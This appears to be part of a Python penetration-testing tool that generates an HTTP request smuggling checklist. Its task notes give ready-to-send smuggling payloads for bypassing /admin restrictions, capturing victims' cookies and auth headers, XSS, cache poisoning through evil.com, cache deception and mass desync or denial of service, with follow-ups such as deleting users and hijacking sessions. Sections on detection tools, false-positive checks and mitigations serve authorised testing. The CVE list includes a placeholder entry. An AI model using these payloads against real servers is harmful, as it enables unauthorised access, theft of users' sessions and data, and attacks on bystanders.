                'notes': '''Front-end proxies block paths like /admin. Smuggled requests bypass inspection.

CL.TE payload:
POST / HTTP/1.1
Host: {target}
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=

Front-end sees POST /, backend processes GET /admin. Host: localhost often bypasses IP restrictions.''',
                'success_indicators': [
                    'Access to /admin endpoint',
                    'Bypassed IP whitelist',
                    '200 OK from restricted path'
                ],
                'failure_indicators': [
                    '403 Forbidden',
                    'Smuggling unsuccessful',
                    'Backend also blocks /admin'
                ],
                'next_steps': [
                    'Delete users, modify configs',
                    'Test other restricted paths (/internal, /api)',
                    'Chain with SSRF to internal network'
                ],
                'alternatives': [
                    'Try TE.CL variant',
                    'Use different Host header values'
                ]
            }
        })

        # Task 24: Capture Victim Requests
        exploit_tasks['children'].append({
            'id': f'capture-victim-{port}',
            'name': 'Capture Victim Requests/Credentials',
            'type': 'manual',
            'metadata': {
                'description': 'Steal victim request headers (cookies, auth tokens) by appending to reflected parameter',
                'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                'notes': '''Smuggle POST with reflected parameter at end of body. Victim request appends after parameter.

Payload:
POST / HTTP/1.1
Host: {target}
Content-Length: 319
Transfer-Encoding: chunked

0

POST /comment HTTP/1.1
Host: {target}
Content-Length: 659
Content-Type: application/x-www-form-urlencoded

csrf=TOKEN&postId=4&name=hacker&email=x@x.com&comment=

Victim request (cookies, headers) appends to comment parameter. Posted publicly, attacker retrieves from /comments.
Limitation: captures until first & character.''',
                'success_indicators': [
                    'Victim cookies/headers visible in comment',
                    'Session tokens stolen',
                    'Authorization headers captured'
                ],
                'failure_indicators': [
                    'No victim request captured',
                    'Reflected parameter not found',
                    'Storage not persistent'
                ],
                'next_steps': [
                    'Use stolen cookies for session hijacking',
                    'Capture multiple victims',
                    'Find parameters without & delimiter'
                ],
                'alternatives': [
                    'Use response desync to steal victim response',
                    'Chain with XSS for exfiltration'
                ]
            }
        })

        # Task 25: Reflected XSS Exploitation
        exploit_tasks['children'].append({
            'id': f'smuggling-xss-{port}',
            'name': 'Exploit Reflected XSS via Smuggling',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit reflected XSS in headers (User-Agent) without victim interaction',
                'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                'notes': '''Smuggle request with XSS in User-Agent header. Victim request receives XSS response.

Payload:
POST / HTTP/1.1
Host: {target}
Transfer-Encoding: chunked
Content-Length: 213

0

GET /post?postId=2 HTTP/1.1
Host: {target}
User-Agent: "><script>alert(1)</script>
Content-Length: 10

A=

Victim request processed after smuggled one. Response reflects User-Agent with XSS. No victim interaction needed.
If server supports HTTP/0.9, can bypass Content-Type: text/plain restrictions.''',
                'success_indicators': [
                    'XSS executes in victim browser',
                    'Reflected in User-Agent',
                    'No interaction required'
                ],
                'failure_indicators': [
                    'User-Agent not reflected',
                    'XSS filtered',
                    'Content-Type prevents execution'
                ],
                'next_steps': [
                    'Steal victim cookies via XSS',
                    'Test HTTP/0.9 for Content-Type bypass',
                    'Chain with cache poisoning'
                ],
                'alternatives': [
                    'Try other reflected headers (Referer, X-Forwarded-For)',
                    'Use response desync for full control'
                ]
            }
        })

        # Task 26: Web Cache Poisoning
        exploit_tasks['children'].append({
            'id': f'cache-poisoning-{port}',
            'name': 'Web Cache Poisoning via Smuggling',
            'type': 'manual',
            'metadata': {
                'description': 'Poison cache to serve malicious response to all users',
                'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                'notes': '''Smuggle request that causes /static/js/app.js to be cached with XSS payload.

Attack:
1. Find on-site redirect with Host header injection
2. Smuggle: GET /post/next?postId=3 with Host: evil.com
3. Follow with: GET /static/js/app.js
4. Redirect causes cache to store evil.com response for /static/js/app.js

All users loading page get XSS from poisoned cache.
Requires: cacheable resource + redirect or reflected content.''',
                'success_indicators': [
                    'Cache poisoned with malicious response',
                    'All users receive XSS',
                    'Persistent across requests'
                ],
                'failure_indicators': [
                    'Cache not poisoned',
                    'No cacheable resources',
                    'Cache validation prevents poisoning'
                ],
                'next_steps': [
                    'Expand to multiple cached resources',
                    'Test cache duration',
                    'Chain with account takeover'
                ],
                'alternatives': [
                    'Use web cache deception',
                    'Test response desync for full control'
                ]
            }
        })

        # Task 27: Web Cache Deception
        exploit_tasks['children'].append({
            'id': f'cache-deception-{port}',
            'name': 'Web Cache Deception (Steal Victim Data)',
            'type': 'manual',
            'metadata': {
                'description': 'Cache victim-specific content (/private/messages) as static resource',
                'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                'notes': '''Smuggle request that causes victim private data to be cached under static URL.

Payload:
POST / HTTP/1.1
Host: {target}
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1
Foo: X

Next request for /someimage.png gets cached with /private/messages response.
Attacker: curl {protocol}://{target}:{port}/someimage.png (retrieves victim data from cache)

Difference from cache poisoning: stealing data, not injecting payload.''',
                'success_indicators': [
                    'Victim private data cached',
                    'Attacker retrieves via static URL',
                    'Credentials/PII exposed'
                ],
                'failure_indicators': [
                    'No caching occurred',
                    'Cache-Control: private prevents caching',
                    'No sensitive endpoints'
                ],
                'next_steps': [
                    'Target /api/user, /profile, /messages',
                    'Steal API keys, tokens, PII',
                    'Test cache expiration'
                ],
                'alternatives': [
                    'Use response desync for direct theft',
                    'Combine with CSRF for actions'
                ]
            }
        })

        tasks['children'].append(exploit_tasks)

        # PHASE 9: Detection & Tools
        tools_tasks = {
            'id': f'smuggling-tools-{port}',
            'name': 'Automated Detection & Tools',
            'type': 'parent',
            'children': []
        }

        # Task 28: Burp HTTP Request Smuggler
        tools_tasks['children'].append({
            'id': f'burp-smuggler-{port}',
            'name': 'Burp HTTP Request Smuggler Scan',
            'type': 'manual',
            'metadata': {
                'description': 'Automated smuggling detection with Burp extension',
                'tags': ['OSCP:HIGH', 'AUTOMATED', 'ENUM'],
                'notes': '''Install Burp HTTP Request Smuggler from BApp Store.

Features:
- Auto-tests CL.TE, TE.CL, TE.TE, H2.TE, H2.CL
- Timing-based detection
- Connection-state probing (first-request routing)
- HTTP/2 downgrade detection

Configuration:
1. Enable "HTTP/2 probing" in extension settings
2. Send request to Repeater
3. Extensions â†’ HTTP Request Smuggler â†’ Smuggle probe
4. Check results tab for vulnerabilities

Extension handles: timing, obfuscation, multi-stage attacks.''',
                'success_indicators': [
                    'Extension reports "CL.TE detected"',
                    'Timing anomalies found',
                    'Connection-state vulnerability confirmed'
                ],
                'failure_indicators': [
                    'No vulnerabilities detected',
                    'All tests timeout',
                    'Extension errors'
                ],
                'next_steps': [
                    'Review extension findings',
                    'Manually verify positive results',
                    'Exploit confirmed vulnerabilities'
                ],
                'alternatives': [
                    'Use smuggler.py CLI tool',
                    'Manual testing with Repeater'
                ],
                'notes': 'Extension URL: https://github.com/PortSwigger/http-request-smuggler. Disable "Update Content-Length" in Repeater.'
            }
        })

        # Task 29: Smuggler.py CLI
        tools_tasks['children'].append({
            'id': f'smuggler-py-{port}',
            'name': 'smuggler.py Automated Scanning',
            'type': 'command',
            'metadata': {
                'command': f'python3 smuggler.py -u {protocol}://{target}:{port}/',
                'description': 'CLI-based request smuggling scanner',
                'tags': ['OSCP:HIGH', 'AUTOMATED', 'ENUM'],
                'flag_explanations': {
                    '-u': 'Target URL to test',
                    '-q': 'Quiet mode (optional)',
                    '-t': 'Timeout in seconds (optional)'
                },
                'success_indicators': [
                    'CL.TE or TE.CL vulnerability detected',
                    'Timing anomalies reported',
                    'Exploit payloads suggested'
                ],
                'failure_indicators': [
                    'No vulnerabilities found',
                    'Connection errors',
                    'All tests fail'
                ],
                'next_steps': [
                    'Review tool output for vulnerability type',
                    'Use suggested exploit payloads',
                    'Verify findings manually'
                ],
                'alternatives': [
                    'Use defparam/smuggler tool',
                    'Use Burp extension',
                    'Manual Burp Repeater testing'
                ],
                'notes': 'Tool: https://github.com/gwen001/pentest-tools/blob/master/smuggler.py. Test timing-based detection.'
            }
        })

        # Task 30: smuggleFuzz
        tools_tasks['children'].append({
            'id': f'smugglefuzz-{port}',
            'name': 'smuggleFuzz Grammar-Based Fuzzing',
            'type': 'command',
            'metadata': {
                'command': f'python3 smugglefuzz.py --url {protocol}://{target}:{port}/',
                'description': 'Grammar-based HTTP fuzzer to find desync discrepancies',
                'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'ENUM'],
                'flag_explanations': {
                    '--url': 'Target URL',
                    '--http2': 'Enable HTTP/2 testing (optional)',
                    '--threads': 'Number of threads (default: 10)'
                },
                'success_indicators': [
                    'Desync discrepancy found',
                    'Malformed request accepted',
                    'Parser differences detected'
                ],
                'failure_indicators': [
                    'No discrepancies found',
                    'All malformed requests rejected',
                    'Tool errors'
                ],
                'next_steps': [
                    'Analyze reported discrepancies',
                    'Craft exploit payloads',
                    'Test on different endpoints'
                ],
                'alternatives': [
                    't-reqs-http-fuzzer',
                    'Moopinger/smugglefuzz',
                    'Manual obfuscation testing'
                ],
                'notes': 'Tool: https://github.com/bahruzjabiyev/t-reqs-http-fuzzer and https://github.com/Moopinger/smugglefuzz. Finds edge case desyncs.'
            }
        })

        tasks['children'].append(tools_tasks)

        # PHASE 10: Pipelining vs Real Desync
        validation_tasks = {
            'id': f'pipelining-validation-{port}',
            'name': 'Distinguish Pipelining from Real Desync',
            'type': 'parent',
            'children': []
        }

        # Task 31: Disable Connection Reuse Test
        validation_tasks['children'].append({
            'id': f'disable-reuse-{port}',
            'name': 'Disable Connection Reuse Test',
            'type': 'manual',
            'metadata': {
                'description': 'Verify desync persists without connection reuse (eliminates false positives)',
                'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                'notes': '''HTTP/1.1 pipelining creates false positives. Test if desync is real:

1. In Burp Intruder/Repeater: disable "HTTP/1 connection reuse"
2. In Turbo Intruder: set requestsPerConnection=1, pipeline=False
3. Re-send smuggling payload
4. Check if behavior disappears

If behavior disappears: likely client-side pipelining (false positive)
If behavior persists: real server-side desync

Connection-locked targets still vulnerable but require reuse for impact.''',
                'success_indicators': [
                    'Desync persists without reuse (real vulnerability)',
                    'Different responses on separate connections',
                    'Backend parsing bug confirmed'
                ],
                'failure_indicators': [
                    'Behavior disappears without reuse (false positive)',
                    'Only works with pipelining',
                    'Client-side artifact'
                ],
                'next_steps': [
                    'If false positive: test connection-locked variant',
                    'If real desync: proceed to exploitation',
                    'Document connection reuse requirements'
                ],
                'alternatives': [
                    'Use HTTP/2 nested-response check',
                    'Test partial-requests probe'
                ],
                'notes': 'See: https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling'
            }
        })

        # Task 32: HTTP/2 Nested Response Check
        validation_tasks['children'].append({
            'id': f'http2-nested-{port}',
            'name': 'HTTP/2 Nested Response Test',
            'type': 'manual',
            'metadata': {
                'description': 'Prove backend desync by getting nested HTTP/1 response in HTTP/2 body',
                'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                'notes': '''Send HTTP/2 request with smuggled HTTP/1 request. If response body contains complete nested HTTP/1 response, proves backend desync (not client pipelining).

Test:
:method: POST
:path: /
content-length: 10

0

GET /test HTTP/1.1

If response body contains:
HTTP/1.1 200 OK
Content-Type: ...

Then backend parsing bug confirmed (not client artifact).''',
                'success_indicators': [
                    'Nested HTTP/1.1 response in HTTP/2 body',
                    'Complete response headers in body',
                    'Backend desync proven'
                ],
                'failure_indicators': [
                    'No nested response',
                    'Only single response received',
                    'Client-side pipelining'
                ],
                'next_steps': [
                    'Real desync confirmed: exploit',
                    'Document backend parsing behavior',
                    'Test on multiple endpoints'
                ],
                'alternatives': [
                    'Use connection-state probe',
                    'Visualize with Burp HTTP Hacker extension'
                ]
            }
        })

        # Task 33: Litmus Test Checklist
        validation_tasks['children'].append({
            'id': f'litmus-checklist-{port}',
            'name': 'Smuggling Litmus Test Checklist',
            'type': 'manual',
            'metadata': {
                'description': 'Complete validation checklist to confirm real desync vs false positive',
                'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                'notes': '''Run these 5 tests to distinguish pipelining from real desync:

1. DISABLE REUSE TEST
   - Turn off HTTP/1 reuse in Burp/Turbo Intruder
   - Re-test payload
   - Result: persists = real, disappears = false positive

2. HTTP/2 NESTED RESPONSE CHECK
   - Send HTTP/2 request with smuggled HTTP/1
   - Check if response body contains nested HTTP/1 response
   - Result: nested = backend desync confirmed

3. PARTIAL REQUESTS PROBE
   - Send incomplete request, wait
   - Check if FE-BE connection mirrors client reuse
   - Result: connection-locked detection

4. STATE PROBES
   - Compare first vs subsequent request behavior on same connection
   - Look for first-request routing/validation
   - Result: Burp Connection-state probe automates

5. VISUALIZE THE WIRE
   - Use Burp HTTP Hacker extension
   - Inspect message framing and concatenation
   - Result: visual confirmation of desync

If ANY test confirms real desync: proceed to exploitation.
If ALL tests indicate pipelining: investigate connection-locked or client-side attacks.''',
                'success_indicators': [
                    'At least 1 test confirms real desync',
                    'Backend parsing bug evident',
                    'Not client-side artifact'
                ],
                'failure_indicators': [
                    'All tests indicate pipelining',
                    'Only works with reuse',
                    'No backend desync'
                ],
                'next_steps': [
                    'If real desync: exploit (bypass, steal, poison)',
                    'If connection-locked: chain with cache/headers',
                    'If client-side: browser-powered desync'
                ],
                'alternatives': [
                    'Use Burp Bambda: SmugglingOrPipelining.bambda',
                    'Consult: https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling'
                ]
            }
        })

        tasks['children'].append(validation_tasks)

        # PHASE 11: Advanced Techniques
        advanced_tasks = {
            'id': f'advanced-smuggling-{port}',
            'name': 'Advanced Smuggling Techniques',
            'type': 'parent',
            'children': []
        }

        # Task 34: Expect: 100-continue Exploitation
        advanced_tasks['children'].append({
            'id': f'expect-continue-{port}',
            'name': 'Expect: 100-continue Header Exploitation',
            'type': 'manual',
            'metadata': {
                'description': 'Abuse Expect: 100-continue header for desync exploitation',
                'tags': ['OSCP:LOW', 'MANUAL', 'EXPLOIT'],
                'notes': '''Expect: 100-continue tells server to wait before sending body. Can cause timing differences in smuggling.

Payload:
POST / HTTP/1.1
Host: {target}
Content-Length: 50
Expect: 100-continue

(wait for 100 Continue response)

GET /admin HTTP/1.1
Host: {target}

If front-end and backend handle Expect differently, can create desync window.
Useful for: timing-based attacks, bypassing rate limits.''',
                'success_indicators': [
                    'Backend waits for 100 Continue',
                    'Timing difference exploitable',
                    'Smuggling successful'
                ],
                'failure_indicators': [
                    'Both servers handle Expect consistently',
                    'No timing difference',
                    '417 Expectation Failed'
                ],
                'next_steps': [
                    'Chain with CL.TE for extended timing window',
                    'Test on upload endpoints',
                    'Exploit for rate limit bypass'
                ],
                'alternatives': [
                    'Use standard CL.TE timing',
                    'Test chunked encoding with delays'
                ],
                'notes': 'See: https://portswigger.net/web-security/request-smuggling/finding (Expect header section)'
            }
        })

        # Task 35: Multiple Nested Injections
        advanced_tasks['children'].append({
            'id': f'nested-injections-{port}',
            'name': 'Multiple Nested Request Injections',
            'type': 'manual',
            'metadata': {
                'description': 'Inject tens of smuggled requests to desync multiple victims (DoS/mass exploit)',
                'tags': ['OSCP:LOW', 'MANUAL', 'EXPLOIT'],
                'notes': '''Unlike classic smuggling (1.5 requests), response smuggling allows injecting FULL requests. Chain multiple smuggled requests:

Payload:
POST / HTTP/1.1
Host: {target}
Content-Length: 1000
Transfer-Encoding: chunked

0

GET /slow-endpoint HTTP/1.1
Host: {target}

POST /xss?q=<script>alert(1)</script> HTTP/1.1
Host: {target}

POST /xss?q=<script>alert(2)</script> HTTP/1.1
Host: {target}

...10+ smuggled requests...

Each smuggled request desyncs a different victim. Mass exploitation or DoS.
CAUTION: Impacts real users. Use only with explicit permission.''',
                'success_indicators': [
                    'Multiple victims desynchronized',
                    'Mass exploitation successful',
                    'DoS condition achieved'
                ],
                'failure_indicators': [
                    'Only first smuggled request processed',
                    'Backend resets connection',
                    'Rate limiting blocks'
                ],
                'next_steps': [
                    'Use for distributed cache poisoning',
                    'Test DoS impact (responsibly)',
                    'Document scope for reporting'
                ],
                'alternatives': [
                    'Single-target smuggling for precision',
                    'Response queue desync for theft'
                ],
                'notes': 'OSCP: Not applicable (impacts multiple users). Bug bounty: high severity but requires careful disclosure.'
            }
        })

        # Task 36: Unicode Breaking Web Server
        advanced_tasks['children'].append({
            'id': f'unicode-break-{port}',
            'name': 'Unicode Character Server Breaking',
            'type': 'manual',
            'metadata': {
                'description': 'Break web server parsing with Unicode (Werkzeug) while keeping connection open',
                'tags': ['OSCP:LOW', 'MANUAL', 'EXPLOIT'],
                'notes': '''Some servers (Werkzeug) break when receiving Unicode in HTTP headers but don't close connection if Connection: keep-alive.

Payload:
GET / HTTP/1.1
Host: {target}
Connection: keep-alive
X-Unicode: [UNICODE_CHAR]

[BODY becomes next request]

Server breaks during header parsing, doesn't read body. Body treated as next HTTP request.
Similar to CL.0 but using Unicode crash instead of ignored Content-Length.

Test with: \\u0080 - \\uffff range characters in custom headers.''',
                'success_indicators': [
                    'Server breaks but connection stays open',
                    'Body treated as new request',
                    'Smuggling successful'
                ],
                'failure_indicators': [
                    'Connection closed on Unicode',
                    'Server handles Unicode correctly',
                    '400 Bad Request with connection close'
                ],
                'next_steps': [
                    'Map vulnerable Unicode ranges',
                    'Test on Werkzeug/Flask apps',
                    'Chain with victim request capture'
                ],
                'alternatives': [
                    'Try null bytes (\\x00)',
                    'Test other malformed headers'
                ],
                'notes': 'Technique: https://mizu.re/post/twisty-python. Werkzeug-specific. Test responsibly.'
            }
        })

        tasks['children'].append(advanced_tasks)

        # PHASE 12: Defensive Measures & CVEs
        defense_tasks = {
            'id': f'defense-cves-{port}',
            'name': 'Known CVEs & Defensive Measures',
            'type': 'parent',
            'children': []
        }

        # Task 37: CVE Research
        defense_tasks['children'].append({
            'id': f'cve-research-{port}',
            'name': 'Known Request Smuggling CVEs',
            'type': 'manual',
            'metadata': {
                'description': 'Research known CVEs for identified proxy/server software',
                'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                'notes': f'''Notable Request Smuggling CVEs (2022-2025):

HTTP/2 DOWNGRADE:
- CVE-2023-25690: Apache mod_proxy rewrite smuggling (fixed 2.4.56)
- CVE-2023-25950: HAProxy 2.7/2.6 request/response smuggling
- CVE-2022-41721: Go MaxBytesHandler HTTP/2 frame parsing

CONNECTION-STATE:
- CVE-2024-2470: Envoy <1.29.0 improper :authority validation
- CVE-2023-39852: Apache Traffic Server <9.2.2 HTTP/2 reuse
- CVE-2022-XXXX: AWS ALB first-request routing (patched 2022)

H2C SMUGGLING:
- No specific CVE (design flaw in proxies forwarding Upgrade)
- Vulnerable: HAProxy, Traefik, Nuster (by design)

Identified software: {product} {version}
Research: searchsploit "{product}", CVE databases, exploit-db.''',
                'success_indicators': [
                    'CVEs found for identified software',
                    'Public exploits available',
                    'Version confirmed vulnerable'
                ],
                'failure_indicators': [
                    'No CVEs found',
                    'Version patched',
                    'Software not identified'
                ],
                'next_steps': [
                    'Test public exploits',
                    'Verify patch level',
                    'Report if unpatched'
                ],
                'alternatives': [
                    'Manual vulnerability testing',
                    'Version banner analysis'
                ]
            }
        })

        # Task 38: Mitigation Validation
        defense_tasks['children'].append({
            'id': f'mitigation-check-{port}',
            'name': 'Check Defensive Measures',
            'type': 'manual',
            'metadata': {
                'description': 'Validate if server implements desync mitigations',
                'tags': ['OSCP:LOW', 'RECON'],
                'notes': '''Defensive measures to check:

1. REQUEST NORMALIZATION
   - Server normalizes/rejects ambiguous CL/TE
   - Test: send both headers, check for rejection

2. SINGLE SOURCE OF LENGTH
   - Server generates CL after parsing, ignores user CL/TE
   - Test: smuggling fails with user-supplied CL

3. CONNECTION ISOLATION
   - Server doesn't reuse connections across users
   - Test: smuggling timing works but no victim impact

4. HTTP/2 END-TO-END
   - No HTTP/1.1 downgrade (eliminates H2.TE/H2.CL)
   - Check: backend speaks HTTP/2 natively

5. UPGRADE HEADER STRIPPING
   - Server strips Upgrade header (except WebSocket)
   - Test: h2c smuggling fails

6. STRICT DESYNC MITIGATION
   - AWS: routing.http.desync_mitigation_mode = strictest
   - Test: all malformed requests rejected

Check if any mitigations in place. If not: high severity.''',
                'success_indicators': [
                    'Mitigations in place',
                    'Smuggling attempts rejected',
                    'Normalized request handling'
                ],
                'failure_indicators': [
                    'No mitigations detected',
                    'Smuggling successful',
                    'Vulnerable configuration'
                ],
                'next_steps': [
                    'Document missing mitigations',
                    'Recommend fixes in report',
                    'Test bypass techniques'
                ],
                'alternatives': [
                    'Review server configuration files',
                    'Contact vendor for mitigation guidance'
                ]
            }
        })

        tasks['children'].append(defense_tasks)

        return tasks
